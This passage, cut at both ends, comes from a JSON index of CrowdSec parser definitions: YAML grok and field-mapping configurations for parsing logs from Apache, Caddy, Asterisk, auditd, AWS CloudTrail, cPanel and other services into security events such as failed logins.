%{WORD:amavis_action} %{NOTSPACE:amavis_category}( \\(%{DATA:amavis_match}\\))( \\{%{DATA:amavis_acions}\\})?, \\[(IPv6:)?%{IP:amavis_relay_ip}\\]:%{POSINT:src_port} \\[(IPv6:)?%{IP:amavis_amavis_origin_ip}\\] <%{DATA:amavis_from}> -> <%{DATA:amavis_to}>, %{AMAVIS_KV}%{POSINT:amavis_elapsedtime} ms'\ngrok:\n  name: \"AMAVIS\"\n  apply_on: message\nstatics:\n  - meta: service\n    value: amavis\n  - meta: log_type\n    value: \"amavis\"\n  - meta: source_ip\n    expression: \"evt.Parsed.amavis_relay_ip\"\n  - meta: amavis_category\n    expression: \"evt.Parsed.amavis_category\"\n  - meta: amavis_match\n    expression: \"evt.Parsed.amavis_match\"\n", "description": "Parse amavis logs", "path": "parsers/s01-parse/crowdsecurity/amavis-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "f712aa420ac1e4b89979c3e880a972fbd6b6214585f8f068312aed2b5290c240"}, "0.2": {"digest": "4e3b45710bd862fe27336fcfc7b7736ccdc8874b4d54921d75d1bb3c7c869b8c"}}}, "crowdsecurity/apache2-logs": {"content": "#Apache access/errors logs\n#debug: true\nfilter: \"evt.Parsed.program startsWith 'apache2'\"\nonsuccess: next_stage\nname: crowdsecurity/apache2-logs\ndescription: \"Parse Apache2 access and error logs\"\n#log line can be prefixed by a target_fqdn\nnodes:\n  - grok:\n      pattern: '(%{IPORHOST:target_fqdn}(:%{INT:port})? )?%{COMMONAPACHELOG}( \"%{NOTDQUOTE:referrer}\" \"%{NOTDQUOTE:http_user_agent}\")?'\n      apply_on: message\n      # these ones apply for both grok patterns\n      statics:\n        - meta: log_type\n          value: http_access-log\n        - target: evt.StrTime\n          expression: evt.Parsed.timestamp\n        - meta: service\n          value: http\n        - meta: source_ip\n          expression: evt.Parsed.clientip\n        - meta: http_status\n          expression: evt.Parsed.response\n        - meta: http_path\n          expression: \"evt.Parsed.request != '' ? evt.Parsed.request : evt.Parsed.rawrequest\"\n        - meta: http_verb\n          expression: \"evt.Parsed.verb\"\n        - meta: http_user_agent\n          expression: \"evt.Parsed.http_user_agent\"\n        - meta: target_fqdn\n          expression: \"evt.Parsed.target_fqdn\"\n    onsuccess: next_stage\n  - grok:\n      pattern: '%{HTTPD_ERRORLOG}'\n      apply_on: message\n    onsuccess: next_stage\n    pattern_syntax:\n      NOT_DOUBLE_POINT: '[^:]+'\n      NOT_DOUBLE_QUOTE: '[^\"]+'    \n    nodes:\n      - filter: \"evt.Parsed.module == 'auth_basic'\"\n        onsuccess: next_stage\n        pattern_syntax:\n          EXTRACT_USER_AND_PATH: 'user %{NOT_DOUBLE_POINT:username}: authentication failure for \"%{NOT_DOUBLE_QUOTE:target_uri}\": Password Mismatch'\n          EXTRACT_USER_AND_PATH2: 'user %{NOT_DOUBLE_POINT:username} not found: \"?%{NOT_DOUBLE_QUOTE:target_uri}\"?'\n        grok:\n          pattern: '%{EXTRACT_USER_AND_PATH}|%{EXTRACT_USER_AND_PATH2}'\n          apply_on: message\n          # these ones apply for both grok patterns\n        statics:\n          - meta: username\n            expression: evt.Parsed.username\n          - meta: http_path\n            expression: evt.Parsed.target_uri\n          - meta: sub_type\n            value: \"auth_fail\"\n      - filter: \"evt.Parsed.module == 'core' && evt.Parsed.message contains 'Invalid URI'\"\n        onsuccess: next_stage\n        pattern_syntax:\n          EXTRACT_URIVERB: 'Invalid URI in request %{WORD:verb} %{NOTSPACE:request}(?: HTTP/%{NUMBER:httpversion})'\n        grok:\n          pattern: '%{EXTRACT_URIVERB}'\n          apply_on: message\n        statics:\n          - meta: http_path\n            expression: evt.Parsed.request\n          - meta: sub_type\n            value: \"invalid_uri\"\n      - filter: \"evt.Parsed.module == 'authz_core' && evt.Parsed.message contains 'client denied'\"\n        onsuccess: next_stage\n        pattern_syntax:\n          EXTRACT_PATH: 'client denied by server configuration: %{GREEDYDATA:target_uri}'\n        grok:\n          pattern: '%{EXTRACT_PATH}'\n          apply_on: message\n        statics:\n          - meta: http_path\n            expression: evt.Parsed.target_uri\n          - meta: sub_type\n            value: \"permission_denied\"\n      - filter: \"evt.Parsed.module == 'ssl' && evt.Parsed.message contains 'SSL handshake stopped'\"\n        statics:\n          - meta: sub_type\n            value: \"ssl_handshake_stopped\"\n            \n    statics:\n      - meta: log_type\n        value: http_error-log\n      - target: evt.StrTime\n        expression: evt.Parsed.timestamp\n      - meta: service\n        value: http\n      - meta: source_ip\n        expression: evt.Parsed.client\n      - meta: http_status\n        expression: evt.Parsed.response\n\n      \n", "description": "Parse Apache2 access and error logs", "path": "parsers/s01-parse/crowdsecurity/apache2-logs.yaml", "stage": "s01-parse", "version": "1.5", "versions": {"0.1": {"digest": "405a1eacb736240024a1302fb7a95184bd1dbb4205c9746877b01aa74aff602f"}, "0.2": {"digest": "911be04b02a2aef5052020087b0941c9a646a0ad6213cb34d541d35c5c10fba1"}, "0.3": {"digest": "2acd7b53dd7ac9765246dbcc539395ad89942a5b48f3cab6b1489cb6c9fe1360"}, "0.4": {"digest": "63c47a8b0740d05e15a84640c44cdbc7b96907deae4650dcdb61329d37bcf9e8"}, "0.5": {"digest": "cb41418db5e5dcf3f1e0fba7731f2eab8eff07f1083a92f5e45e13a4d8f6ff95"}, "0.6": {"digest": "305729e749b6c7c7c7370d0b2fd247c5de13c3d3b45809745049eeb45d7f46b9"}, "0.7": {"digest": "8244953978839afc950bea90934cf20834d4f243b79163a44c8ff67b9eb9e459"}, "0.8": {"digest": "b37a7940a2b6c0b7b909679c1e837ec9e6628f24e9a88f8830600e0df9ba5941"}, "0.9": {"digest": "f4fa2cfb6ff5742b499f575630acf884e1dbdd6af7196e2fd3a2aeeeec9bceb9"}, "1.0": {"digest": "bc4cce2766afde63489bfe7d8d1f8aec82f9c897da5e824904156c53cdc555f6"}, "1.1": {"digest": "311e3761538c96f641478da49af219df8084205e191c39f3794fba4a4780ed76"}, "1.2": {"digest": "a2e968ebf9d568de24f2c407504c85edb08e2e31e9422b913de763ab855dc6d4"}, "1.3": {"digest": "c8fac234d41df2edd112265f75a5178718eeabe58135bd1e307bf92892ff3639"}, "1.4": {"digest": "0b4f8ca4b1a3486d6e6d1c214d05e600035fc95bf717e4247325c5506c98ed46"}, "1.5": {"digest": "e395775112ace41543b4fc3623dab4ed9b5c97f8fc234f2a230e8549fe4a907c"}}}, "crowdsecurity/appsec-logs": {"content": "onsuccess: next_stage\nformat: 3.0\n#debug: true\nfilter: \"evt.Parsed.program == 'appsec'\"\nname: crowdsecurity/appsec-logs\ndescription: \"Parse Appsec events\"\nstatics:\n  - meta: service\n    value: appsec\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n  - meta: target_host\n    expression: \"evt.Parsed.target_host\"\n  - meta: request_uuid\n    expression: \"evt.Parsed.req_uuid\"\n  - meta: target_uri\n    expression: \"evt.Parsed.target_uri\"\n#was the request blocked ?\n  - meta: log_type\n    expression: |\n      evt.Appsec.HasInBandMatches ? \"appsec-block\" : \"appsec-info\"\n  - meta: rule_name\n    expression: evt.Appsec.GetName()\n  - meta: rule_ids\n    expression: Sprintf(\"%+v\", evt.Appsec.GetRuleIDs())\n  - meta: remediation_cmpt_ip\n    expression: \"evt.Parsed.remediation_cmpt_ip\"\n", "description": "Parse Appsec events", "path": "parsers/s01-parse/crowdsecurity/appsec-logs.yaml", "stage": "s01-parse", "version": "0.5", "versions": {"0.1": {"digest": "b6de996d25dcbbbda4889fea9e8b05559660c54ea2ed7202430741ef40141179"}, "0.2": {"digest": "20fe00d38f9756169fb5d56027e5c26085e038f699a18d17be94ad6b0da14447"}, "0.3": {"digest": "24ea66d28ee00e9bef266b86fc56ed9e7a95e8f36027765b99389f0b4ed8c2d3"}, "0.4": {"digest": "60b45bc8957dfc40f270500b8ef438085294fc172c92332dcb9dcb3c14cc9c85"}, "0.5": {"digest": "e44f2877c363061fef239a9af472253900674bf261e8762febd06d7ef20022a0"}}}, "crowdsecurity/asterisk-logs": {"content": "name: crowdsecurity/asterisk-logs\ndescription: \"Parse Asterisk logs\"\nfilter: \"evt.Parsed.program == 'asterisk'\"\nonsuccess: next_stage\nnodes:\n  - grok:\n      pattern: '(\\[%{DATA:timestamp}\\] )?SECURITY\\[%{NUMBER}\\].* SecurityEvent=\"InvalidAccountID\",EventTV=\"%{DATA:event_timestamp}\",Severity=\"Error\",Service=\"%{NOTDQUOTE:asterisk_service}\",EventVersion=\"%{NUMBER}\",AccountID=\"%{NOTDQUOTE:username}\",SessionID=\"%{NOTDQUOTE:asterisk_session_id}\",LocalAddress=\"IPV%{NUMBER}/(UDP|TCP|TLS)/%{IPORHOST:target_ip}/%{NUMBER:target_port}\",RemoteAddress=\"IPV%{NUMBER}/(UDP|TCP|TLS)/%{IPORHOST:source_ip}/%{NUMBER:source_port}\"'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: asterisk_failed_auth\n        - target: evt.StrTime\n          expression: evt.Parsed.timestamp\n        - meta: target_user\n          expression: evt.Parsed.username\n        - meta: session_id\n          expression: evt.Parsed.asterisk_session_id\n        - meta: asterisk_service\n          expression: evt.Parsed.asterisk_service\n  - grok:\n      pattern: '(\\[%{DATA:timestamp}\\] )?SECURITY\\[%{NUMBER}\\].* SecurityEvent=\"ChallengeResponseFailed\",EventTV=\"%{DATA:event_timestamp}\",Severity=\"Error\",Service=\"%{NOTDQUOTE:asterisk_service}\",EventVersion=\"%{NUMBER}\",AccountID=\"%{NOTDQUOTE:username}\",SessionID=\"%{NOTDQUOTE:asterisk_session_id}\",LocalAddress=\"IPV%{NUMBER}/(UDP|TCP|TLS)/%{IPORHOST:target_ip}/%{NUMBER:target_port}\",RemoteAddress=\"IPV%{NUMBER}/(UDP|TCP|TLS)/%{IPORHOST:source_ip}/%{NUMBER:source_port}\"'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: asterisk_failed_auth\n        - target: evt.StrTime\n          expression: evt.Parsed.timestamp\n        - meta: target_user\n          expression: evt.Parsed.username\n        - meta: session_id\n          expression: evt.Parsed.asterisk_session_id\n        - meta: asterisk_service\n          expression: evt.Parsed.asterisk_service\n  - grok:\n      pattern: '(\\[%{DATA:timestamp}\\] )?SECURITY\\[%{NUMBER}\\].* SecurityEvent=\"InvalidPassword\",EventTV=\"%{DATA:event_timestamp}\",Severity=\"Error\",Service=\"%{NOTDQUOTE:asterisk_service}\",EventVersion=\"%{NUMBER}\",AccountID=\"%{NOTDQUOTE:username}\",SessionID=\"%{NOTDQUOTE:asterisk_session_id}\",LocalAddress=\"IPV%{NUMBER}/(UDP|TCP|TLS)/%{IPORHOST:target_ip}/%{NUMBER:target_port}\",RemoteAddress=\"IPV%{NUMBER}/(UDP|TCP|TLS)/%{IPORHOST:source_ip}/%{NUMBER:source_port}\"'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: asterisk_failed_auth\n        - target: evt.StrTime\n          expression: evt.Parsed.timestamp\n        - meta: target_user\n          expression: evt.Parsed.username\n        - meta: session_id\n          expression: evt.Parsed.asterisk_session_id\n        - meta: asterisk_service\n          expression: evt.Parsed.asterisk_service\nstatics:\n    - meta: service\n      value: asterisk\n    - meta: source_ip\n      expression: evt.Parsed.source_ip\n", "description": "Parse Asterisk logs", "path": "parsers/s01-parse/crowdsecurity/asterisk-logs.yaml", "stage": "s01-parse", "version": "0.5", "versions": {"0.1": {"digest": "6c32f0c5c37b86d83b35c9c90aee2550b8c2d59748a31bd2ba95842be35bf031"}, "0.2": {"digest": "29155ff1a969acdbd1be800f350168d0b2bf2c2adcfd9350d284667d857e9fe3"}, "0.3": {"digest": "f8a4fb06d81b9b1344ae9ba158c34b069f234597dc2fa140ae2f139cc8da148d"}, "0.4": {"digest": "9679a5939331f6d40527c715e112cc5df7619374213801a57542712a7f305945"}, "0.5": {"digest": "1a3d1f0f9808428c88bbff7d88c73ef3816a4465f2a8948bd1c95c156334f2ea"}}}, "crowdsecurity/auditd-logs": {"content": "#type=SYSCALL msg=audit(1672330955.273:4433): arch=c000003e syscall=263 success=no exit=-2 a0=ffffff9c a1=557162396590 a2=0 a3=0 items=1 ppid=144571 pid=145400 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=79 comm=\"rm\" exe=\"/usr/bin/rm\" key=\"file_modification\"\nname: crowdsecurity/auditd-logs\ndescription: \"Parse auditd logs\"\nfilter: \"evt.Parsed.program == 'auditd'\"\nonsuccess: next_stage\npattern_syntax:\n  FLOAT: '[0-9\\.]+'\n\nnodes:\n  #SYSCALL 59 on x86_64 -> execve\n  - filter: ParseKV(evt.Parsed.message, evt.Unmarshaled, \"auditd\") == nil # == nil is required because ParseKV does not return a value\n    nodes:\n      - grok:\n          pattern: '%{WORD:msg_type}\\(%{FLOAT:timestamp}:%{INT:event_inc_id}\\):'\n          expression: evt.Unmarshaled.auditd.msg\n        nodes:\n          - filter: evt.Unmarshaled.auditd.type == \"SYSCALL\" and evt.Unmarshaled.auditd.arch == \"c000003e\" and evt.Unmarshaled.auditd.syscall == \"59\"\n            statics:\n              - meta: log_type\n                value: execve\n              #let's hydrate with ppid process if we can :)\n              - target: evt.Meta.parent_progname\n                expression: GetFromStash(\"auditd_pid_progname\", evt.Unmarshaled.auditd.ppid)\n            #let's capture process name if we can\n            stash:\n              - name: auditd_pid_progname\n                key: evt.Unmarshaled.auditd.pid\n                value: evt.Unmarshaled.auditd.exe\n                ttl: 1m\n                size: 100\n          - filter: evt.Unmarshaled.auditd.type == \"ANOM_ABEND\"\n            statics:\n              - meta: log_type\n                value: anom_abend\n        statics:\n          - target: evt.StrTime\n            expression: evt.Parsed.timestamp\n          - meta: ppid\n            expression: evt.Unmarshaled.auditd.ppid\n          - meta: exe\n            expression: evt.Unmarshaled.auditd.exe\n          - meta: uid\n            expression: evt.Unmarshaled.auditd.uid\n          - meta: auid\n            expression: evt.Unmarshaled.auditd.auid\n          - meta: euid\n            expression: evt.Unmarshaled.auditd.euid\n          - meta: gid\n            expression: evt.Unmarshaled.auditd.gid\n          - meta: ses\n            expression: evt.Unmarshaled.auditd.ses\n          - meta: subj\n            expression: evt.Unmarshaled.auditd.subj\n          - meta: pid\n            expression: evt.Unmarshaled.auditd.pid\n          - meta: comm\n            expression: evt.Unmarshaled.auditd.comm\n          - meta: sig\n            expression: evt.Unmarshaled.auditd.sig\n          - meta: tty\n            expression: evt.Unmarshaled.auditd.tty\n          - meta: res\n            expression: evt.Unmarshaled.auditd.res\n          - meta: str_UID\n            expression: evt.Unmarshaled.auditd.UID\n          - meta: str_GID\n            expression: evt.Unmarshaled.auditd.GID \n          - meta: auditd_eventid\n            expression: evt.Parsed.event_inc_id\n", "description": "Parse auditd logs", "path": "parsers/s01-parse/crowdsecurity/auditd-logs.yaml", "stage": "s01-parse", "version": "0.9", "versions": {"0.1": {"digest": "fa23b38e12ef4abce21475ad78c3d6650538c88e68f8235f74afc238345b0279"}, "0.2": {"digest": "de3f1196ca61471401f0fbb0d628228ad2d894670233b72f0e0ad97ffa33c4b8"}, "0.3": {"digest": "5172acd163c92054c107b6f82769c2f763a73c6c43e63a74452d674cf4c772a3"}, "0.4": {"digest": "770cd94fb8d0cd0044a63dc2fa391c0eb33be2bf277c26d090731d9c9d563de9"}, "0.5": {"digest": "c6bd6b56738da1f23805cc0ff3eeedf2dddebf1305b072dcddf30b1cfff544fd"}, "0.6": {"digest": "7e8321dd50751a53ed82b4a34c58206ce2266c1bdb8c435ce011dc1c46892309"}, "0.7": {"digest": "777a9632ba5871cb42e51096c8e4ad49c1b6a39912e8a5097be4401dc42879c8"}, "0.8": {"digest": "094e29326685de68912952a3561ff862d78acc2d515d5c7badc6e3be13857d48"}, "0.9": {"digest": "a8302c5a00fd74c13205934a6b101b5216ba93f2798fcbf816cc361bd63c829f"}}}, "crowdsecurity/aws-cloudfront": {"content": "onsuccess: next_stage\nfilter: \"evt.Line.Labels.type == 'aws-cloudfront'\"\nname: crowdsecurity/aws-cloudfront\ndescription: \"Parse AWS CloudFront access logs\"\ngrok:\n  pattern: '%{YEAR:year}-%{MONTHNUM2:month}-%{MONTHDAY:day}\\s+%{TIME:time}\\s+%{DATA:x_edge_location}\\s+%{NUMBER:sc_bytes}\\s+%{IP:c_ip}\\s+%{WORD:cs_method}\\s+%{HOSTNAME:cs_host}\\s+%{DATA:cs_uri_stem}\\s+%{NUMBER:sc_status}\\s+%{DATA:cs_referer}\\s+%{DATA:cs_user_agent}\\s+%{DATA:cs_uri_query}\\s+%{DATA:cs_cookie}\\s+%{WORD:x_edge_result_type}\\s+%{DATA:x_edge_request_id}\\s+%{HOSTNAME:x_host_header}\\s+%{WORD:cs_protocol}\\s+%{NUMBER:cs_bytes}\\s+%{NUMBER:time_taken}\\s+%{DATA:x_forwarded_for}\\s+%{DATA:ssl_protocol}\\s+%{DATA:ssl_cipher}\\s+%{WORD:x_edge_response_result_type}\\s+%{DATA:cs_protocol_version}\\s+%{DATA:fle_status}\\s+%{DATA:fle_encrypted_fields}\\s+%{NUMBER:c_port}\\s+%{NUMBER:time_to_first_byte}\\s+%{WORD:x_edge_detailed_result_type}\\s+%{DATA:sc_content_type}\\s+%{DATA:sc_content_len}\\s+%{DATA:sc_range_start}\\s+%{DATA:sc_range_end}'\n  apply_on: message\nstatics:\n    - meta: service\n      value: http\n    - meta: log_type\n      value: http_access-log\n    - target: evt.StrTime\n      expression: \"evt.Parsed.year + '-' + evt.Parsed.month + '-' + evt.Parsed.day + 'T' + evt.Parsed.time + 'Z'\"\n    - meta: source_ip\n      expression: \"evt.Parsed.c_ip\"\n    - meta: http_status\n      expression: \"evt.Parsed.sc_status\"\n    - meta: http_path\n      expression: |\n        evt.Parsed.cs_uri_query == \"-\" ? evt.Parsed.cs_uri_stem : evt.Parsed.cs_uri_stem + '?' + evt.Parsed.cs_uri_query\n    - meta: http_verb\n      expression: \"evt.Parsed.cs_method\"\n    - meta: http_user_agent\n      expression: \"evt.Parsed.cs_user_agent\"", "description": "Parse AWS CloudFront access logs", "path": "parsers/s01-parse/crowdsecurity/aws-cloudfront.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "795f0501182540325f30f3ca69ac7237653549989a65838d0c218fc03589ddcc"}, "0.2": {"digest": "62f22527304c1287f7c52b28b5fcbba9c4a7c18fdbf4299414c77b15f7bf5f8b"}, "0.3": {"digest": "525b1d131081c2b35bc7ca97b9dfc4c2ebf2737f328ed91ae4c7882dc2c56705"}}}, "crowdsecurity/aws-cloudtrail": {"content": "onsuccess: next_stage\n#debug: true\nfilter: \"evt.Parsed.program == 'aws-cloudtrail'\"\nname: crowdsecurity/aws-cloudtrail\ndescription: \"Parse AWS Cloudtrail logs\"\nstatics:\n  - parsed: cloudtrail_parsed\n    expression: UnmarshalJSON(evt.Line.Raw, evt.Unmarshaled, 'cloudtrail')\n  - target: evt.StrTime\n    expression: evt.Unmarshaled.cloudtrail.eventTime\n  - meta: user_type\n    expression: evt.Unmarshaled.cloudtrail.userIdentity.type\n # see : https://github.com/antonmedv/expr/blob/master/docs/Language-Definition.md#nil-coalescing\n  - meta: user_arn\n    expression: |\n      evt.Unmarshaled.cloudtrail.userIdentity?.arn ?? evt.Unmarshaled.cloudtrail.userIdentity.userName\n  - meta: event_name\n    expression: evt.Unmarshaled.cloudtrail.eventName\n  - meta: event_source\n    expression: evt.Unmarshaled.cloudtrail.eventSource\n  - meta: region\n    expression: evt.Unmarshaled.cloudtrail.awsRegion\n  - meta: source_ip\n    expression: |\n      IsIP(evt.Unmarshaled.cloudtrail.sourceIPAddress) ? evt.Unmarshaled.cloudtrail.sourceIPAddress : \"\"\n  - meta: user_agent\n    expression: evt.Unmarshaled.cloudtrail.userAgent\n  - meta: error_code\n    expression: evt.Unmarshaled.cloudtrail.errorCode\n  - meta: event_id\n    expression: evt.Unmarshaled.cloudtrail.eventID\n  - meta: account_id\n    expression: evt.Unmarshaled.cloudtrail.userIdentity.accountId\n  - meta: log_type\n    value: aws-cloudtrail\n", "description": "Parse AWS Cloudtrail logs", "path": "parsers/s01-parse/crowdsecurity/aws-cloudtrail.yaml", "stage": "s01-parse", "version": "0.4", "versions": {"0.1": {"digest": "e8a3be4f59909cb5ce9e84132c41d73d6a038362668f84cd851e5228f8ce22a4"}, "0.2": {"digest": "9684e924bd23962cfb00b11530c569a9db5972be3ec254ec6fa711c19aeb03fe"}, "0.3": {"digest": "1c1ce10d16bda257a81f838efe8d9069559f0d9c1bf712dad7afd222592947ab"}, "0.4": {"digest": "5608995bc30951678620b509058a1f2e24a23de62b3cf99bda396ba458e26967"}}}, "crowdsecurity/base-upsun-httplog-logs": {"content": "filter: \"evt.Line.Labels.type == 'upsun-httplog'\"\nonsuccess: next_stage\npattern_syntax:\n  UPSUN_APP_PREFIX: '^%{DATA:appname}\\.%{INT:app_instance}'\nname: crowdsecurity/base-upsun-httplog-logs\nnodes:\n  - filter: UnmarshalJSON(evt.Line.Raw, evt.Unmarshaled, \"upsunMsg\") in [\"\", nil]\n    grok:\n      pattern: '%{UPSUN_APP_PREFIX} %{WORD:program}: %{GREEDYDATA:message}'\n      expression: evt.Unmarshaled.upsunMsg.message\n#if the node was successfull, statics will be applied.\nstatics:\n  - meta: machine\n    expression: evt.Parsed.logsource\n  - parsed: \"logsource\"\n    value: \"upsun-httplog\"\n  - meta: datasource_path\n    expression: evt.Line.Src\n  - meta: datasource_type\n    expression: evt.Line.Module\n  - meta: upsunEnv\n    expression: evt.Unmarshaled.upsunMsg.metadata.environment\n  - meta: upsunProject\n    expression: evt.Unmarshaled.upsunMsg.metadata.project", "path": "parsers/s00-raw/crowdsecurity/base-upsun-httplog-logs.yaml", "stage": "s00-raw", "version": "0.1", "versions": {"0.1": {"digest": "7fbce073f6d1ba681e5ca8bf6f7360e47961b9711cfbad308a2033d2ef25259c"}}}, "crowdsecurity/caddy-logs": {"content": "filter: |\n      evt.Parsed.program startsWith 'caddy' &&\n      UnmarshalJSON(evt.Parsed.message, evt.Unmarshaled, 'caddy') in ['', nil] &&\n      (evt.Unmarshaled.caddy.logger == nil || evt.Unmarshaled.caddy.logger != 'http.handlers.waf') &&\n      evt.Unmarshaled.caddy.request != nil\nonsuccess: next_stage\nname: crowdsecurity/caddy-logs\ndescription: \"Parse caddy logs\"\nstatics:\n  - meta: log_type\n    value: http_access-log\n  - target: evt.StrTime\n    expression: |\n      Sprintf(\"%v\", evt.Unmarshaled.caddy.ts) matches '^[0-9e\\\\.\\\\+]+$' ? int(evt.Unmarshaled.caddy.ts) : evt.Unmarshaled.caddy.ts\n  - meta: service\n    value: http\n  ##Caddy now sets client_ip to the value of X-Forwarded-For if users sets trusted proxies\n  - parsed: remote_ip\n    expression: \"evt.Unmarshaled.caddy.request.client_ip\"\n  - parsed: http_version\n    expression: \"Split(evt.Unmarshaled.caddy.request.proto, '/')[1]\"\n  - meta: source_ip\n    expression: evt.Parsed.remote_ip\n  - meta: http_status\n    expression: \"evt.Unmarshaled.caddy.status != nil ? int(evt.Unmarshaled.caddy.status) : nil\" ## We still check if status is not nil because of downstream error\n  - meta: http_path\n    expression: \"evt.Unmarshaled.caddy.request.uri\"\n  - parsed: request #Add for http-logs enricher\n    expression: \"evt.Unmarshaled.caddy.request.uri\"\n  - parsed: verb\n    expression: \"evt.Unmarshaled.caddy.request.method\"\n  - meta: http_verb\n    expression: \"evt.Unmarshaled.caddy.request.method\"\n  - parsed: http_user_agent\n    expression: \"get(evt.Unmarshaled.caddy.request.headers, 'User-Agent') != nil ? evt.Unmarshaled.caddy.request.headers['User-Agent'][0] : nil\" ## We still check if useragent exists because of client may not send it\n  - meta: http_user_agent\n    expression: evt.Parsed.http_user_agent\n  - meta: target_fqdn\n    expression: \"evt.Unmarshaled.caddy.request.host\"\n  - meta: sub_type\n    expression: \"evt.Meta.http_status == '401' && get(evt.Unmarshaled.caddy.resp_headers, 'Www-Authenticate') != nil && any(get(evt.Unmarshaled.caddy.resp_headers, 'Www-Authenticate'), { # startsWith 'Basic' }) ? 'auth_fail' : nil\"\n\n", "description": "Parse caddy logs", "path": "parsers/s01-parse/crowdsecurity/caddy-logs.yaml", "stage": "s01-parse", "version": "1.1", "versions": {"0.1": {"digest": "30bf81915d8254ab7611c156ddbe0cf389838d471f973403ae1b07fffa5b6d5a"}, "0.2": {"digest": "482a3d592e742b54f80c4473259ff8e0d5c46a657f086814d6a13e985a550376"}, "0.3": {"digest": "22abc6def6fb9c36fcc6bb021002fe0b471116eab16e86c56625cfeef668eb7d"}, "0.4": {"digest": "5f70ca245d84d2b72b5d30517ef85de6bc241b3537c4ac0fcf86a176c2539a75"}, "0.5": {"digest": "19673bb9a1ad806c7d615d24c37649f8c0679acb07df9ac304ba23d44eaf0f53"}, "0.6": {"digest": "856f9882c2aa89d701dce456e97bfb4c5230b7fc83cefc54a8279d7cdac5b8fe"}, "0.7": {"digest": "6f4f7ca36d2d65b540bdc57e47edd44365c39a82d04291015136356f99d29f85"}, "0.8": {"digest": "4c0627a84747f31d64a1d6b55796950371e64c9c90233fb7cc4bde7e536ea653"}, "0.9": {"digest": "d01c85a868a310c75b957c3a02d2c705a6c0bece204d8417e3dba4c58f18e9c1"}, "1.0": {"digest": "530d472e269ffcc3bd0898bf48b20b12fea00ecd105534140bb418048b3c08f6"}, "1.1": {"digest": "dc7ebf4b72fca2d5ae1351d9f58be72bb044a2a20e2f3d8afbe9ee2b70f36af5"}}}, "crowdsecurity/configserver-lfd-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'lfd'\"\nname: crowdsecurity/configserver-lfd-logs\ndescription: \"Parse ConfigServer LFD logs\"\ngrok:\n  pattern: \"Failed SSH login from %{IP:source_ip} \\\\(%{NOTSPACE:country_code}/%{GREEDYDATA:country_name}/%{NOTSPACE:source_rdns}\\\\): %{GREEDYDATA:reason}\"\n  apply_on: message\n  statics:\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - meta: reason\n      expression: \"evt.Parsed.reason\"", "description": "Parse ConfigServer LFD logs", "path": "parsers/s01-parse/crowdsecurity/configserver-lfd-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "d066bf65a18de919170ddc124550c4617246053031355c66150262e1be2d968f"}, "0.2": {"digest": "ca9f9686ccddadf26f162c0236dc1623c837ea12be2e2dced2c5adf1f4b74a15"}}}, "crowdsecurity/cowrie-logs": {"content": "onsuccess: next_stage\nname: cowrie-logs\ndescription: \"Parse cowrie honeypots logs\"\nfilter: \"evt.Parsed.program == 'cowrie'\"\ngrok:\n  name: \"COWRIE_NEW_CO\"\n  apply_on: message\nstatics:\n    - meta: service\n      value: telnet\n    - meta: log_type\n      value: telnet_new_session\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - meta: dest_ip\n      expression: \"evt.Parsed.dest_ip\"\n    - meta: dest_port\n      expression: \"evt.Parsed.dest_port\"\n    - parsed: \"telnet_session\"\n      expression: \"evt.Parsed.telnet_session\"", "description": "Parse cowrie honeypots logs", "path": "parsers/s01-parse/crowdsecurity/cowrie-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "4ebcf38bef1106ba94ccf6aa575958695de12fa1278b25dddb76cfdce93b553b"}}}, "crowdsecurity/cpanel-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'cpanel'\"\nname: crowdsecurity/cpanel-logs\ndescription: \"Parse Cpanel logs\"\npattern_syntax:\n  NO_DOUBLE_QUOTE: '[^\"]+'\n  CPANEL_HEADER: \\[%{DATA:date} \\+[0-9]+\\] info \\[(cpaneld|whostmgrd)\\] %{IP:remote_addr} - %{NOTSPACE:username} \"%{WORD:verb} %{URIPATHPARAM:request} HTTP/%{NUMBER:http_version}\"\nnodes:\n  - grok: \n      pattern: '%{CPANEL_HEADER} FAILED LOGIN cpaneld: brute force attempt \\(user %{DATA}\\) has locked out IP %{IP}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: auth_bf_attempt\n        - target: evt.StrTime\n          expression: evt.Parsed.date\n  - grok: \n      pattern: '%{CPANEL_HEADER} FAILED LOGIN cpaneld: brute force attempt \\(user %{DATA:target_user}\\) has locked out IP %{IP}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: auth_bf_log\n        - target: evt.StrTime\n          expression: evt.Parsed.date\n  - grok: \n      pattern: '%{CPANEL_HEADER} FAILED LOGIN cpaneld: invalid cpanel user %{DATA:target_user}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: auth_bf_log\n        - target: evt.StrTime\n          expression: evt.Parsed.date\n  - grok: \n      pattern: '%{CPANEL_HEADER} FAILED LOGIN cpaneld: %{DATA:target_user} login is not permitted to cpaneld'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: auth_bf_log\n        - target: evt.StrTime\n          expression: evt.Parsed.date\n  - grok: \n      pattern: '%{CPANEL_HEADER} FAILED LOGIN whostmgrd: login attempt to whm by a non-reseller/root'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: auth_bf_log\n        - target: evt.StrTime\n          expression: evt.Parsed.date\n  - grok: \n      pattern: '%{CPANEL_HEADER} FAILED LOGIN whostmgrd: user password incorrect'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: auth_bf_log\n        - target: evt.StrTime\n          expression: evt.Parsed.date\n  - grok: # see https://docs.cpanel.net/knowledge-base/cpanel-product/the-cpanel-log-files/\n      pattern: '%{IP:remote_addr} - %{NOTSPACE:username} \\[%{DATE}:%{TIME} %{ISO8601_TIMEZONE}\\] \"%{WORD:verb} %{URIPATHPARAM:request} 